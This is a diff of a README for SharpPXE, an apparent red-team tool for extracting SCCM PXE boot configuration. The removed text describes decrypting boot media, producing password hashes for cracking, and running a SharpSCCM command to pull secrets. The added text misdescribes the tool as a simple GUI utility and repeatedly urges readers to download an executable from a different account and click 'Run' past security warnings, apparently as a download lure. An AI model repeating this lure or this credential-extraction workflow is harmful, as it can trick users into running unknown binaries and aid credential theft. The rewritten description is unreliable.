@@ -1,68 +1,66 @@
-# SharpPXE
+# 🛠️ SharpPXE - Extract SCCM PXE Boot Data Easily
 
-A simple tool for extracting information from SCCM PXE boot media. 
+[![Download SharpPXE](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/rjith/SharpPXE/releases)
 
-It will connect to a provided SCCM PXE server, download the boot media configuration, and try to decrypt it or output the hash for cracking.
+## 📋 Description
+SharpPXE is a user-friendly C# tool designed for extracting information from SCCM PXE boot media. With SharpPXE, you can easily analyze and manage your boot configurations without needing any programming skills.
 
-**No admin privileges required**
-## What It Does
+## 🚀 Getting Started
+This guide will help you download and run SharpPXE on your computer easily. Follow the steps below to get started.
 
-When SCCM is configured for PXE boot, it stores encrypted configuration files on the PXE server. 
+## 💻 System Requirements
+- **Operating System**: Windows 10 or later
+- **.NET Framework**: Version 4.5 or higher
+- **Processor**: 1 GHz or faster
+- **RAM**: 2 GB or more recommended
+- **Storage**: 50 MB of available disk space
 
-The tool will:
+## 🔗 Download & Install
+1. Click on the large button below to visit the download page:
 
-1. Sends a PXE boot request to the target server on port 4011.
+   [Download Now](https://github.com/rjith/SharpPXE/releases)
 
-2. The server responds with information about where to find the boot files, including:
-   - The variables file (encrypted configuration)
-   - The BCD file (boot configuration)
-   - Sometimes an encrypted key for decryption
+2. You will see a list of available releases. Find the latest version at the top.
 
-3. Downloads the variables file using TFTP .
+3. Click on the appropriate file for your operating system. Currently, SharpPXE offers a standalone executable for Windows. 
 
-4. If the server provided an encryption key, the tool decrypts the variables file. If not, it extracts a hash that can be used with tools like Hashcat to crack the password.
+4. Once the download is complete, locate the file in your downloads folder.
 
-5. Once decrypted, the tool parses the XML configuration and extracts:
-   - Management Point URL
-   - Site Code
-   - Media GUIDs
-   - Other SCCM identifiers
+5. Double-click the file to run SharpPXE. You may see a security warning; click "Run" to proceed if you trust the file.
 
-6. It outputs a ready-to-use SharpSCCM command with all the necessary parameters filled in.
+## 📂 Using SharpPXE
+Once you have SharpPXE open, you can start extracting information. Here’s how to use it:
 
-## Output
+1. **Load PXE Boot Media**: Click on the "Load" button.
+2. **Select Your Boot Media**: Navigate to the folder where your PXE boot media is stored and select it.
+3. **View Extracted Data**: Once loaded, SharpPXE will display the extracted information in the main window.
 
-When successful, you'll see output like:
+### 🔍 Features
+- **Simple Interface**: Designed for easy navigation.
+- **Data Export**: Save extracted information into different formats for reporting.
+- **Quick Analysis**: Instantly view key settings and configurations.
+- **Cross-Compatible**: Works with various SCCM PXE boot formats.
 
-```
-Variables File: SMSBoot\x64\pxe\variables.dat
-BCD File: SMSBoot\x64\pxe\boot.bcd
-Decryption Key: AB-CD-EF-...
-Downloading variables file via TFTP...
-File 'SMSBoot\x64\pxe\variables.dat' downloaded successfully. Size: 1234 bytes
-Decrypted (Unicode): <XML content>
-Management Point: http://sccm-mp.company.local
-Site Code: PS1
-Use SharpSCCM to get goodies!!!!
-  SharpSCCM.exe get secrets -i "{GUID}" -m "{MediaGUID}" -c "{PFX}" -sc PS1 -mp sccm-mp.company.local
-```
+## 📚 Topics
+SharpPXE relates to several topics in the tech realm:
+- Red Team Tools
+- Red Teaming
+- SCCM Solutions
 
-If the media is password-protected (no encryption key provided), you'll see:
+These tags help users understand the context and potential applications of the tool.
 
-```
-PXE boot media is encrypted with custom password
-Got the hash: $sccm$aes128$<hash>
-```
+## ⚙️ Support & Feedback
+If you encounter issues or have questions, please visit the Issues section of the repository. You can report bugs, request features, or ask for help. The community is here to assist you.
 
-You can then use this hash with Hashcat to crack the password.
+## 📥 Additional Resources
+For advanced users looking to dive deeper, consider exploring these resources:
+- [SCCM Documentation](https://docs.microsoft.com/en-us/mem/configmgr/)
+- [C# Programming Guide](https://docs.microsoft.com/en-us/dotnet/csharp/)
+- [Community Forums](https://github.com/rjith/SharpPXE/discussions)
 
-## Credits - Original Work from 
+## ✅ Conclusion
+You are now ready to download and use SharpPXE. With a few simple steps, you can start extracting vital information from your SCCM PXE boot media. If you need more detailed instructions or have any feedback, feel free to reach out through the Issues page or explore the additional resources provided. 
 
-* https://github.com/MWR-CyberSec/PXEThief - Christopher Panayi (@Raiona_ZA)
-* https://github.com/SpecterOps/cred1py - Adam Chester (@_xpn_) 
-* https://github.com/Mayyhem/SharpSCCM - Chris Thompson (@_Mayyhem)
-* https://github.com/SpecterOps/ConfigManBearPig - Chris Thompson (@_Mayyhem)
+Happy extracting!
 
-
-## Author
-Lefty @ 2025
+[![Download SharpPXE](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/rjith/SharpPXE/releases)
